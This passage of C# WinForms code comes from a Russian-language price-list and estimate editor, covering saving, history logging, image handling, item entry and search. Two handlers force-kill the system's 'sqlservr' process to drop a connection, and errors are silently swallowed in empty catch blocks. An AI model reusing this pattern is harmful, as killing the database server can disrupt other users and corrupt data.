                {
                    timer_auto_update.Enabled = Enabled;
                    Process[] proc = Process.GetProcessesByName("logo");
                    proc[0].Kill();
                    timerlogo2.Enabled = false;
                }
                catch
                {
                }
            }

            if (rezult_nuhna_li_bez_praisa == DialogResult.No)
            {
                this.Close();
            }

        }

        DialogResult rezult_nuhna_li_bez_praisa;
        string[] settlement_price = new string[46];
        private void tableBindingNavigatorSaveItem_Click(object sender, EventArgs e)
        {
            if (open_window_otchetik == true)
            {
                label_consol.Text = "Там редактор повторов открыт! Закрой его!!!!";
                return;
            }        
            //убить подключение sql
            try
            {
                Process[] proc = Process.GetProcessesByName("sqlservr");
                proc[0].Kill();
            }
            catch
            {

            }
                Save_history_user_work("Я внес изменения и сохраненил прайс.","");
                сохранитьПрайсToolStripMenuItem.PerformClick();
                        
        }


        public void save_praise()
        {
           
            label_добавленно.Text = "Сохранено";
            label_добавленно.Visible = true;
            timer_labe_добавленна.Interval = 500;
            timer_labe_добавленна.Enabled = true;
        }






       public void Save_history_user_work(string действие,string файл)
        {
            //запись в основной
            FileInfo lio = new FileInfo(istohtik_bazi);
            if (setting[4] != lio.DirectoryName)
            {
                return;
            }


            if (файл != "")
            {
                if (файл.IndexOf(lio.DirectoryName+"\\шаблоны\\") > -1)
                {
                }
                else
                {
                    return;
                }
            }



                //значит если решил сохраниться и прайс в папке рабочей то надо или создать или отредактировать файл. 
                //пробую почитать файл у себя 
            string my_baza_put = setting[4] + "\\data.txt";
                string[] my_baza_data = new string[14];
                try
                {
                    //Значит файл есть. Надо с ним что то делать! 
                    using (StreamReader stream = new StreamReader(my_baza_put))
                    {
                        int c = 0;
                        while (stream.Peek() >= 0)
                        {
                            my_baza_data[c] = stream.ReadLine();
                            c++;
                        }
                        stream.Close();
                    }
                    DateTime this_date = DateTime.Now;
                    my_baza_data[7] = DateTime.Now.Hour.ToString();
                    my_baza_data[8] = DateTime.Now.Minute.ToString();
                    my_baza_data[9] = DateTime.Now.Second.ToString();
                    my_baza_data[10] = DateTime.Now.Day.ToString();
                    my_baza_data[11] = DateTime.Now.Month.ToString();
                    my_baza_data[12] = DateTime.Now.Year.ToString();
                    my_baza_data[13] = setting[3];
                    using (StreamWriter writer = new StreamWriter(my_baza_put, false, System.Text.Encoding.UTF8))
                    {
                        for (int i = 0; i < 13; i++)
                        {
                            writer.WriteLineAsync(my_baza_data[i]);
                        }
                        writer.WriteAsync(my_baza_data[13]);
                    }
                }
                catch
                {
                    // Файла нет. Надо создавать с нуля.                
                    MessageBox.Show("Нельзя, вот так взять и впишнуть в папку некий прайс.\nСкачай с нета актуальный и редатируй, сколько тебе влезит!", "Отказано", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                    return;
                }
            




            //запись в записную книжку! 

            //Если нет её. Создадим! 
            string path = setting[4] + "\\My_history_work_"+setting[3] +".txt";
            bool fileExist = File.Exists(path);
            if (fileExist)
            {
            }
            else
            {                
                FileInfo fi1 = new FileInfo(path);
                if (!fi1.Exists)
                {
                    //Create a file to write to.
                    using (StreamWriter sw = fi1.CreateText())
                    {
                        sw.WriteLine("История моей работы в программе. Автор:"+setting[3]);
                        sw.WriteLine("Дата создания дневника:" + DateTime.Now);
                        sw.WriteLine("");
                    }
                }
            }
             bool stop = false;
            //запись в файл!




            
            try
            {                
                StreamWriter sw = new StreamWriter(path, true, Encoding.UTF8);                                              
                sw.WriteLine(DateTime.Now+" "+действие);                             
                sw.Close();
            }
            catch
            {
            
            }
            







        }

        
        private void Button1_загрузить_изображение(object sender, EventArgs e)
        {

            label_consol.Text = "Попытка вставить говницо!";
            OpenFileDialog open_dialog = new OpenFileDialog(); //создание диалогового окна для выбора файла
            open_dialog.Filter = "Image Files(*.BMP;*.JPG;*.GIF;*.PNG)|*.BMP;*.JPG;*.GIF;*.PNG"; //формат загружаемого файла
            if (open_dialog.ShowDialog() == DialogResult.OK) //если в окне была нажата кнопка "ОК"
            {
                try
                {
                    Bitmap image1 = new Bitmap(open_dialog.FileName);
                    if (image1.Size.Height > 401 || image1.Size.Width > 401)
                    {
                        label_consol.Text = "В меня пытаются воткнуть здоровенню картинку!. Эй!.";
                        DialogResult result = MessageBox.Show(
                         "Картинка превышает размер 400х400 пиксилей!\nИмеет размеры: " + image1.Size.Height.ToString() + " высоты и " + image1.Size.Width.ToString() + " ширины. \n\nЕсли нажмёте Да- перенесу как есть.\nЕсли нажмешь Нет - сконвертирую и уменьшу.\nЕсли нажмешь Отмена- ничего не вставлю в эту ячейку.",
                         "ой, ё..стопэ..",
                         MessageBoxButtons.YesNoCancel,
                         MessageBoxIcon.Information);
                        if (result == DialogResult.Yes)
                        {

                            фотографияPictureBox.Image = image1;
                            tableDataGridView.Rows[tableDataGridView.CurrentCell.RowIndex].Cells[4].Value = image1;
                            label_consol.Text = "Загружена картинка в ячейку! Ну ты понимаешь, что если 1 Мб фото. И 10000 фото в базе, то это 10Gb оперативки надо только на фото!";
                        }
                        else if
                    (result == DialogResult.No)
                        {
                            if (image1.Width > 401) { image1 = new Bitmap(image1, new Size(400, (400 * image1.Height) / image1.Width)); }

                            else { image1 = new Bitmap(image1, new Size((400 * image1.Width) / image1.Height, 400)); }

                            фотографияPictureBox.Image = image1;
                            tableDataGridView.Rows[tableDataGridView.CurrentCell.RowIndex].Cells[4].Value = image1;

                            label_consol.Text = "Загружена картинка в строку! Я её уменьшила. Все ок!";
                        }
                        else if
                        (result == DialogResult.Cancel) { label_consol.Text = "Юзер передумал! Может кофейу?!?. Вылей мне в клаву."; }
                    }
                    else
                    {
                        фотографияPictureBox.Image = image1;
                        tableDataGridView.Rows[tableDataGridView.CurrentCell.RowIndex].Cells[4].Value = image1;
                        label_consol.Text = "Загружена картинка в строку!";
                    }
                }
                catch
                {
                    MessageBox.Show("Невозможно открыть выбранный файл. С файлом, что то не так!",
                   "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    label_consol.Text = "Неполучилось вставить изображение! бывает. Попробуй другой.";
                }
            }


        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {

        }






        #region заного залить в таблицу с базы
        //заного залить в таблицу

        System.Windows.Forms.Timer dewef = new System.Windows.Forms.Timer();
        private void toolStripButton1_Click_1(object sender, EventArgs e)
        {
            if (open_window_otchetik == true)
            {
                label_consol.Text = "Там редактор повторов открыт! Закрой его.";
                return;
            }
            dewef.Tick += new System.EventHandler(this.обновим_надпись);
            label_consol.Text = "Сливаю данные заново. Ждите";
            label_добавленно.Visible = true;
            label_добавленно.Text = "Загрузка....";
            dewef.Interval = 30;
            dewef.Enabled = true;

        }


        private void обновим_надпись(object sender, EventArgs e)
        {
            dewef.Enabled = false;
            dewef.Tick -= new System.EventHandler(this.обновим_надпись);




            try
            {
                using (var fs = File.Open(istohtik_bazi, FileMode.Open, FileAccess.Read, FileShare.None))
                {
                    System.IO.FileInfo obj = new System.IO.FileInfo(istohtik_bazi);
                }
                this.tableTableAdapter.Fill(this.данные.Table);
                label_consol.Text = "Заново слил с базы.";
            }
            catch
            {
                System.IO.FileInfo obj = new System.IO.FileInfo(istohtik_bazi);
                if (Directory.Exists(obj.Directory.ToString()))
                {
                    MessageBox.Show("Файл прайса занят, чуть по позже попробуй.");
                    label_consol.Text = "Файл прайса занят, кто то тоже сидит, повтори позже..";
                }
                else
                {
                    MessageBox.Show("Нет связи с устройством, где лежит файл прайса.");
                    label_consol.Text = "Нет связи с устройством, где лежит файл прайса.";
                    обновитьЦенуСФайлаExcelToolStripMenuItem.Enabled = false;
                    изменитьНаЦенуПроизводителяToolStripMenuItem.Enabled = false;
                }
            }

            //убить подключение sql
            try
            {
                Process[] proc = Process.GetProcessesByName("sqlservr");
                proc[0].Kill();
            }
            catch
            {
            }
            label_добавленно.Visible = false;

        }
        //заного залить в таблицу конец

        #endregion заного залить в таблицу с базы




        private void button1_Click(object sender, EventArgs e)
        {
            try
            {

                System.Drawing.Image image1 = Clipboard.GetImage(); //рисунок из буфера
                if (image1.Size.Height > 401 || image1.Size.Width > 401) // условие, если рисунок больше 400 пикселей по высоте, или ширине
                {
                    label_consol.Text = "В меня пытаются воткнуть здоровенную картинку!. Эй!.";
                    DialogResult result = MessageBox.Show(
                     "Рисунок в буфере превышает размер 400х400 пиксилей!\nИмеет размеры: " + image1.Size.Height.ToString() + " высоты и " + image1.Size.Width.ToString() + " ширины. \n\nЕсли нажмёте Да- перенесу как есть.\nЕсли нажмешь Нет - сконвертирую и уменьшу.\nЕсли нажмешь Отмена- ничего не вставлю в эту ячейку.",
                     "У нас тут проблемка.",
                     MessageBoxButtons.YesNoCancel,
                     MessageBoxIcon.Information);
                    if (result == DialogResult.Yes)
                    {

                        фотографияPictureBox.Image = image1;
                        tableDataGridView.Rows[tableDataGridView.CurrentCell.RowIndex].Cells[4].Value = image1;
                        label_consol.Text = "Загружена картинка! Ну ты понимаешь, что если 1 Мб фото. И 10000 фото в базе, то это 10Gb оперативки надо только на фото!";
                    }
                    else if
                (result == DialogResult.No)
                    {
                        if (image1.Width > 401) { image1 = new Bitmap(image1, new Size(400, (400 * image1.Height) / image1.Width)); }

                        else { image1 = new Bitmap(image1, new Size((400 * image1.Width) / image1.Height, 400)); }

                        фотографияPictureBox.Image = image1;
                        tableDataGridView.Rows[tableDataGridView.CurrentCell.RowIndex].Cells[4].Value = image1;

                        label_consol.Text = "Загружена картинка в ячейку из буфера! Я её уменьшила. Все ок!";
                    }
                    else if
                    (result == DialogResult.Cancel) { label_consol.Text = "Юзер передумал! Не смог принять решение."; }
                }
                else
                {
                    фотографияPictureBox.Image = image1;
                    tableDataGridView.Rows[tableDataGridView.CurrentCell.RowIndex].Cells[4].Value = image1;
                    label_consol.Text = "Загружена картинка из буфера в ячейку таблицы!";
                }

            }
            catch
            {

                label_consol.Text = "В буфере какое то говно!";

            }

        }

        private void button_скриншот_Click(object sender, EventArgs e)
        {
            try { Clipboard.SetImage(фотографияPictureBox.Image); label_consol.Text = "Рисунок поместила в буфер"; } catch { label_consol.Text = "Не получилось, нечего заганять."; } // загнать в буфер обмена 
        }

        private void button_сохр_изобр_в_фаил_Click(object sender, EventArgs e)
        {



            SaveFileDialog saveFileDialog1 = new SaveFileDialog(); //создание диалогового окна для выбора файла
            saveFileDialog1.FileName = артикулTextBox.Text;
            saveFileDialog1.Filter = "изображение(.jpg)|*.jpg|с прозрачностью(.png)|*.png|древний формат(*.bmp)|*.bmp"; //формат загружаемого файла
            try
            {

                if (saveFileDialog1.ShowDialog() == DialogResult.Cancel)
                    return;
                // получаем выбранный файл
                string filename = saveFileDialog1.FileName;
                // сохраняем текст в файл

                string format = saveFileDialog1.FileName;
                format = format.Substring(format.Length - 3);
                if (format == "jpg") фотографияPictureBox.Image.Save(saveFileDialog1.FileName, System.Drawing.Imaging.ImageFormat.Jpeg);
                if (format == "bmp") фотографияPictureBox.Image.Save(saveFileDialog1.FileName, System.Drawing.Imaging.ImageFormat.Bmp);
                if (format == "png") фотографияPictureBox.Image.Save(saveFileDialog1.FileName, System.Drawing.Imaging.ImageFormat.Png);


                фотографияPictureBox.Image.Save(saveFileDialog1.FileName, System.Drawing.Imaging.ImageFormat.Jpeg);
                label_consol.Text = "Файл сохранен по пути:" + saveFileDialog1.FileName;

                // MessageBox.Show("Файл сохранен");  
            }
            catch
            {
                MessageBox.Show("Невозможно сохранить файл",
               "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                label_consol.Text = "Не смертельна, может нет доступа к папке, не от админа сидим тут";
            }


        }

        private void button_удалить_изобр_в_фаил_Click(object sender, EventArgs e)
        {
            фотографияPictureBox.Image = null; label_consol.Text = "Рисунок удален";

            tableDataGridView.Rows[tableDataGridView.CurrentCell.RowIndex].Cells[4].Value = null;
        }





        private void bindingNavigatorDeleteItem_Click(object sender, EventArgs e)
        {

        }



        private void button_добавить_значение_в_табл_Click(object sender, EventArgs e)
        {



            if (textBox_new_артикул.Text == null || textBox_new_артикул.Text == "Пусто" || textBox_new_артикул.Text == "" ||
               textBox_new_производитель.Text == null || textBox_new_производитель.Text == "Пусто" || textBox_new_производитель.Text == "" ||
               textBox_new_наименование.Text == null || textBox_new_наименование.Text == "Пусто" || textBox_new_наименование.Text == ""
               || numericUpDown1.Value == 0
                )
            {
                if (numericUpDown1.Value == 0) { MessageBox.Show("Исправьте пожалуйста цену!", "Предупреждение!"); }
                else
                {
                    MessageBox.Show("Нельзя вписывать Пусто или Ничего в ячейки прайса!", "Предупреждение!");

                }

                label_consol.Text = "Не добавлена новая позиция в прайс. Пользователь в вписал какую то фигню!";

            }
            else
            {
                bool xa = false;
                string copy = "";
                for (int x = 0; x < tableDataGridView.Rows.Count; x++)
                {
                    string baza = "";

                    try { baza = tableDataGridView.Rows[x].Cells[3].Value.ToString(); } catch { }
                    if (textBox_new_артикул.Text == baza) { copy = "\nПроизводитель: " + tableDataGridView.Rows[x].Cells[1].Value.ToString() + "\nНаименование: " + tableDataGridView.Rows[x].Cells[2].Value.ToString() + "\n"; xa = true; }
                }

                if (xa == true)
                {
                    label_consol.Text = "Проверку данных новая позиция не прошла!. Нужно принять решение!.";
                    DialogResult result = MessageBox.Show(
                     "Смотри, в прайсе есть:\n" + copy + "\nЯ могу добавить новой строкой. \n Но ты лучше нажми нет! И еще раз всё проверь!",
                     "В прайсе уже есть такая фигня",
                     MessageBoxButtons.YesNo,
                     MessageBoxIcon.Information);
                    if (result == DialogResult.Yes) { xa = false; } else if (result == DialogResult.No) { }
                }
                if (xa == false)
                {
                    bindingNavigatorAddNewItem.Visible = true;
                    bindingNavigatorAddNewItem.PerformClick(); // добавить строку
                                                               //   номерTextBox.PerformLayout();
                    bindingNavigatorAddNewItem.Visible = false;

                    groupBox_поиск.Visible = true;
                    производительTextBox.Text = textBox_new_производитель.Text;
                    //   производительTextBox.PerformLayout();
                    наименованиеTextBox.Text = textBox_new_наименование.Text;
                    //   наименованиеTextBox.PerformLayout();
                    артикулTextBox.Text = textBox_new_артикул.Text;
                    //  артикулTextBox.PerformLayout();
                    ценаTextBox.Text = numericUpDown1.Value.ToString();
                    //  ценаTextBox.PerformLayout();
                    if (pictureBox_new_image.Image != null)
                    {
                        Bitmap newpic = new Bitmap(pictureBox_new_image.Image);
                        фотографияPictureBox.Image = newpic;
                        pictureBox_no_image_добавить_в_прайс.Visible = true;

                        if (pictureBox_new_image.Image != null)
                        {
                            pictureBox_new_image.Image.Dispose();
                            pictureBox_new_image.Image = null;
                        }

                    }
                    else фотографияPictureBox.Image = null;

                    groupBox_поиск.Visible = false;



                    tableDataGridView.CurrentCell = tableDataGridView.Rows[tableDataGridView.RowCount - 1].Cells[2];
                    label_consol.Text = "Добавлена новая позиция в прайс. Порядковый номер:" + tableDataGridView[0, this.tableBindingSource.Count - 1].Value.ToString();
                    tableDataGridView.CurrentCell = tableDataGridView.Rows[tableDataGridView.RowCount - 2].Cells[2];


                    //подчищаем 
                    textBox_new_артикул.Text = "Пусто";
                    textBox_new_производитель.Text = "Пусто";
                    textBox_new_наименование.Text = "Пусто";
                    numericUpDown1.Value = 0;

                }
            }


        }

        private void tableDataGridView_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }
        //  mouse = new int[] {0,0};
        private void numericUpDown1_Click(object sender, EventArgs e)
        {
            if (numericUpDown1.Value == 0)
            {
                SendKeys.Send("^{A}");
                SendKeys.Send("{BACKSPACE}");
            }
        }

        private void numericUpDown1_MouseClick(object sender, MouseEventArgs e)
        {

        }

        private void numericUpDown1_DoubleClick(object sender, EventArgs e)
        {
            //  SendKeys.Send("^{A}");
            //  SendKeys.Send("{BACKSPACE}");
        }

        private void button_new_foto_Click(object sender, EventArgs e)
        {
            try
            {

                System.Drawing.Image image1 = Clipboard.GetImage(); ;
                if (image1.Size.Height > 401 || image1.Size.Width > 401)
                {
                    label_consol.Text = "В меня пытаются воткнуть здоровенню картинку!. Эй!.";
                    DialogResult result = MessageBox.Show(
                     "Рисунок в буфере превышает размер 400х400 пиксилей!\nИмеет размеры: " + image1.Size.Height.ToString() + " высоты и " + image1.Size.Width.ToString() + " ширины. \n\nЕсли нажмёте Да- перенесу как есть.\nЕсли нажмешь Нет - сконвертирую и уменьшу.\nЕсли нажмешь Отмена- ничего не вставлю в эту ячейку.",
                     "У нас тут проблемка.",
                     MessageBoxButtons.YesNoCancel,
                     MessageBoxIcon.Information);
                    if (result == DialogResult.Yes)
                    {

                        pictureBox_new_image.Image = image1;
                        pictureBox_no_image_добавить_в_прайс.Visible = false;
                        label_consol.Text = "Загружена картинка! Ну ты понимаешь, что если 1 Мб фото. И 10000 фото в базе, то это 10Gb оперативки надо только на фото!";
                    }
                    else if
                (result == DialogResult.No)
                    {
                        if (image1.Width > 401) { image1 = new Bitmap(image1, new Size(400, (400 * image1.Height) / image1.Width)); }

                        else { image1 = new Bitmap(image1, new Size((400 * image1.Width) / image1.Height, 400)); }

                        pictureBox_new_image.Image = image1;
                        pictureBox_no_image_добавить_в_прайс.Visible = false;
                        label_consol.Text = "Загружена картинка из буфера! Я её уменьшила. Все ок!";
                    }
                    else if
                    (result == DialogResult.Cancel) { label_consol.Text = "Юзер передумал! Может по кофейку?!?. Вылей мне в клаву."; }
                }
                else
                {
                    pictureBox_new_image.Image = image1;
                    pictureBox_no_image_добавить_в_прайс.Visible = false;
                    label_consol.Text = "Загружена картинка из буфера!";
                }



                label_consol.Text = "Изображение вставленно из буфера.";
            }
            catch
            {

                label_consol.Text = "В буфере какое то говно!";

            }

        }

        private void button_new_foto_down_Click(object sender, EventArgs e)
        {
            label_consol.Text = "Попытка вставить говницо!";
            OpenFileDialog open_dialog = new OpenFileDialog(); //создание диалогового окна для выбора файла
            open_dialog.Filter = "Image Files(*.BMP;*.JPG;*.GIF;*.PNG)|*.BMP;*.JPG;*.GIF;*.PNG|All files (*.*)|*.*"; //формат загружаемого файла
            if (open_dialog.ShowDialog() == DialogResult.OK) //если в окне была нажата кнопка "ОК"
            {
                try
                {
                    Bitmap image1 = new Bitmap(open_dialog.FileName);
                    if (image1.Size.Height > 401 || image1.Size.Width > 401)
                    {
                        label_consol.Text = "В меня пытаются воткнуть здоровенню картинку!. Эй!.";
                        DialogResult result = MessageBox.Show(
                         "Рисунок с названием превышает размер 400х400 пиксилей!\nИмеет размеры: " + image1.Size.Height.ToString() + " высоты и " + image1.Size.Width.ToString() + " ширины. \n\nЕсли нажмёте Да- перенесу как есть.\nЕсли нажмешь Нет - сконвертирую и уменьшу.\nЕсли нажмешь Отмена- ничего не вставлю в эту ячейку.",
                         "Ай, яй, яй...",
                         MessageBoxButtons.YesNoCancel,
                         MessageBoxIcon.Information);
                        if (result == DialogResult.Yes)
                        {

                            pictureBox_new_image.Image = image1;
                            pictureBox_no_image_добавить_в_прайс.Visible = false;
                            label_consol.Text = "Загружена картинка! Ну ты понимаешь, что если 1 Мб фото. И 10000 фото в базе, то это 10Gb оперативки надо только на фото!";
                        }
                        else if
                    (result == DialogResult.No)
                        {
                            if (image1.Width > 401) { image1 = new Bitmap(image1, new Size(400, (400 * image1.Height) / image1.Width)); }

                            else { image1 = new Bitmap(image1, new Size((400 * image1.Width) / image1.Height, 400)); }

                            pictureBox_new_image.Image = image1;
                            pictureBox_no_image_добавить_в_прайс.Visible = false;

                            label_consol.Text = "Загружена картинка! Я её уменьшила. Все ок!";
                        }
                        else if
                        (result == DialogResult.Cancel) { label_consol.Text = "Юзер передумал! Может кофейу?!?. Вылей мне в клаву."; }
                    }
                    else
                    {
                        pictureBox_new_image.Image = image1;
                        pictureBox_no_image_добавить_в_прайс.Visible = false;
                        label_consol.Text = "Загружена картинка!";
                    }
                }
                catch
                {
                    MessageBox.Show("Невозможно открыть выбранный файл. Друг это не то говно!",
                    "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    label_consol.Text = "Неполучилось вставить изображение! бывает. Забей.";
                }
            }
            dialog_mess("Stop");
        }

        //Окно поиска по базе. 

        string[] naimen_proizvoditel; // список производителей (урезанный) 
        string[] naimen_proizvoditel_FULL; // список производителей (полный) 
        string[] naimen_naimenovania_FULL; // список наименование (полный) 
        string[] naimen_артикул_FULL; // список артикул (полный) 
        string[] naimen_цена_FULL;// список цена (полный) 
        string[][] массив_производителей = new string[1][]; // массив от производителя
        string[][] массив_наименования = new string[1][];// наименование говна от наименования
        string[][] массив_артикул = new string[1][];// наименование говна от артикул
        string[][] массив_цена = new string[1][];

        private void button2_обновить_список_поиска_Click(object sender, EventArgs e)
        {
            // загоним списокс базы. в это окно

            // 1) слижем все данные с графы производитель
            comboBox1_поиск.Items.Clear(); //чистим список 1

            naimen_proizvoditel_FULL = new string[this.tableBindingSource.Count];
            naimen_naimenovania_FULL = new string[this.tableBindingSource.Count];
            naimen_артикул_FULL = new string[this.tableBindingSource.Count];
            naimen_цена_FULL = new string[this.tableBindingSource.Count];
            for (int a = 0; a < this.tableBindingSource.Count; a++)
            {
                naimen_proizvoditel_FULL[a] = tableDataGridView[1, a].Value.ToString();
                naimen_naimenovania_FULL[a] = tableDataGridView[2, a].Value.ToString();
                naimen_артикул_FULL[a] = tableDataGridView[3, a].Value.ToString();
                naimen_цена_FULL[a] = tableDataGridView[5, a].Value.ToString();
            }

            // уберем повторы из списка производителя
            naimen_proizvoditel = naimen_proizvoditel_FULL.Distinct().ToArray();

            массив_производителей = new string[naimen_proizvoditel.Count()][]; //присвоили 3 ячейки из списка
            массив_наименования = new string[naimen_proizvoditel.Count()][];
            массив_артикул = new string[naimen_proizvoditel.Count()][];
            массив_цена = new string[naimen_цена_FULL.Count()][];


            for (int x = 0; x < naimen_proizvoditel.Count(); x++) //3 in
            {
                int k = 0;
                for (int y = 0; y < naimen_proizvoditel_FULL.Count(); y++) // 8 in
                {
                    if (naimen_proizvoditel_FULL[y] == naimen_proizvoditel[x]) { k++; }
                }
                массив_производителей[x] = new string[k];
                массив_наименования[x] = new string[k];
                массив_артикул[x] = new string[k];
                массив_цена[x] = new string[k];

            }

            for (int z = 0; z < naimen_proizvoditel.Count(); z++) // 3 in
            {
                int q = 0;
                for (int y = 0; y < naimen_proizvoditel_FULL.Count(); y++) // 8 in
                {


                    if (naimen_proizvoditel_FULL[y] == naimen_proizvoditel[z])
                    {

                        массив_производителей[z][q] = naimen_proizvoditel_FULL[y];
                        массив_наименования[z][q] = naimen_naimenovania_FULL[y];
                        массив_артикул[z][q] = naimen_артикул_FULL[y];
                        массив_цена[z][q] = naimen_цена_FULL[y];
                        q++;
                    }
                }




            }

            comboBox1_поиск.Items.AddRange(naimen_proizvoditel);
            try { comboBox1_поиск.SelectedIndex = 0; } catch { label_consol.Text = "Неудачное подключение к прайсу!"; }




        }

        private void comboBox1_поиск_SelectedIndexChanged(object sender, EventArgs e)
        {
            comboBox_наименование_поиск_по_базе.Items.Clear(); //чистим список 2 
            comboBox_наименование_поиск_по_базе.Items.AddRange(массив_наименования[comboBox1_поиск.SelectedIndex]);
            comboBox_наименование_поиск_по_базе.SelectedIndex = 0;

            comboBox_артикул_поиск_по_базе.Items.Clear(); //чистим список 3 
            comboBox_артикул_поиск_по_базе.Items.AddRange(массив_артикул[comboBox1_поиск.SelectedIndex]);
            comboBox_артикул_поиск_по_базе.SelectedIndex = 0;

            comboBox_цена_поиск_по_базе.Items.Clear(); //чистим список 4
            comboBox_цена_поиск_по_базе.Items.AddRange(массив_цена[comboBox1_поиск.SelectedIndex]);
            comboBox_цена_поиск_по_базе.SelectedIndex = 0;

        }

        private void comboBox_наименование_поиск_по_базе_SelectedIndexChanged(object sender, EventArgs e)
        {
            try { comboBox_артикул_поиск_по_базе.SelectedIndex = comboBox_наименование_поиск_по_базе.SelectedIndex; } catch { }
            try { comboBox_цена_поиск_по_базе.SelectedIndex = comboBox_наименование_поиск_по_базе.SelectedIndex; } catch { }





            int l = 0;
            int s = 0;
            for (int x = 0; x < tableDataGridView.NewRowIndex; x++)
            {
                if (comboBox1_поиск.Text == Convert.ToString(tableDataGridView.Rows[l].Cells[1].Value) && s == comboBox_наименование_поиск_по_базе.SelectedIndex) { x = 10000; }
                if (comboBox1_поиск.Text == Convert.ToString(tableDataGridView.Rows[l].Cells[1].Value) && s < comboBox_наименование_поиск_по_базе.SelectedIndex) { s++; }
                l++;
            }
            try
            {
                tableDataGridView.CurrentCell = tableDataGridView[1, l - 1];
                label_consol.Text = "Найдено в базе по поиску";
            }
            catch { label_consol.Text = "не смогла указать в таблице картинку"; }


        }

        private void comboBox_артикул_поиск_по_базе_SelectedIndexChanged(object sender, EventArgs e)
        {
            try { comboBox_наименование_поиск_по_базе.SelectedIndex = comboBox_артикул_поиск_по_базе.SelectedIndex; } catch { }
            try { comboBox_цена_поиск_по_базе.SelectedIndex = comboBox_артикул_поиск_по_базе.SelectedIndex; } catch { }
        }

        private void comboBox_цена_поиск_по_базе_SelectedIndexChanged(object sender, EventArgs e)
        {
            try { comboBox_наименование_поиск_по_базе.SelectedIndex = comboBox_цена_поиск_по_базе.SelectedIndex; } catch { }
            try { comboBox_артикул_поиск_по_базе.SelectedIndex = comboBox_цена_поиск_по_базе.SelectedIndex; } catch { }
        }

        //происходит при смене размера окна формы
        private void Form1_Resize(object sender, EventArgs e)
        {


        }

        //Этап 2
        /*    ЛЕПИМ В БАЗУ   */
        private void button_new_razdel_Click(object sender, EventArgs e)
        {



            if (numericUpDown2.Value == 1) { dataGridView_расчёт_2.Rows.Add(textBox_new_stolbeth.Text); dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0]; }
            if (numericUpDown2.Value == 2) { dataGridView_расчёт_2.Rows.Add("", textBox_new_stolbeth.Text); dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0]; }
            if (numericUpDown2.Value == 3) { dataGridView_расчёт_2.Rows.Add("", "", textBox_new_stolbeth.Text); dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0]; }
            if (numericUpDown2.Value == 4) { dataGridView_расчёт_2.Rows.Add("", "", "", textBox_new_stolbeth.Text); dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0]; }
            label_consol_2.Text = "Дабавлен новый раздел: " + textBox_new_stolbeth.Text + "         Всего строк: " + dataGridView_расчёт_2.NewRowIndex.ToString();
            for (int i = 0; i < 8; i++)
            {
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[i].Style.BackColor = Color.PowderBlue;
            }
            dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[10].Style.BackColor = Color.PowderBlue;
            razhet_label.Visible = true;//требуется расчёт
        }
        private void button_new_razdel_MarginChanged(object sender, EventArgs e)
        {

        }

        private void button_new_razdel_MouseCaptureChanged(object sender, EventArgs e)
        {


        }

        private void button_new_razdel_MouseClick(object sender, MouseEventArgs e)
        {

        }




        private void button_new_razdel_vmesto_Click(object sender, EventArgs e)
        {
            try
            {

                if (dataGridView_расчёт_2.CurrentRow.Index == dataGridView_расчёт_2.Rows.Count - 2)
                {
                    button_del_razhet_end.PerformClick();

                    if (numericUpDown2.Value == 1) { dataGridView_расчёт_2.Rows.Add(textBox_new_stolbeth.Text); dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0]; }
                    if (numericUpDown2.Value == 2) { dataGridView_расчёт_2.Rows.Add("", textBox_new_stolbeth.Text); dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0]; }
                    if (numericUpDown2.Value == 3) { dataGridView_расчёт_2.Rows.Add("", "", textBox_new_stolbeth.Text); dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0]; }
                    if (numericUpDown2.Value == 4) { dataGridView_расчёт_2.Rows.Add("", "", "", textBox_new_stolbeth.Text); dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0]; }
                }
                else
                {
                    int df = ((int)numericUpDown2.Value - 1);


                    //проверяем есть ли и если есть то уничтожаем текущую
                    if (dataGridView_расчёт_2.CurrentRow.Index > -1 && !dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].IsNewRow)
                        dataGridView_расчёт_2.Rows.RemoveAt(dataGridView_расчёт_2.CurrentRow.Index);
                    // добавляем новую и идем вперед
                    dataGridView_расчёт_2.Rows.Insert(dataGridView_расчёт_2.CurrentCell.RowIndex, 1);
                    //загоняем в предыдущую надпись
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex - 1].Cells[df].Value = textBox_new_stolbeth.Text;

                    if (checkBox3.Checked == false) { dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex - 1].Cells[0]; }// переместим курсор в под неё //ниже перейти?

                    for (int i = 0; i < 8; i++)
                    {
                        dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[i].Style.BackColor = Color.PowderBlue;
                    }
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[10].Style.BackColor = Color.PowderBlue;
                }

                razhet_label.Visible = true;//требуется расчёт
                label_consol_2.Text = "Дабавлен новый раздел: " + textBox_new_stolbeth.Text + "         Всего строк: " + dataGridView_расчёт_2.NewRowIndex.ToString();
            }
            catch
            {
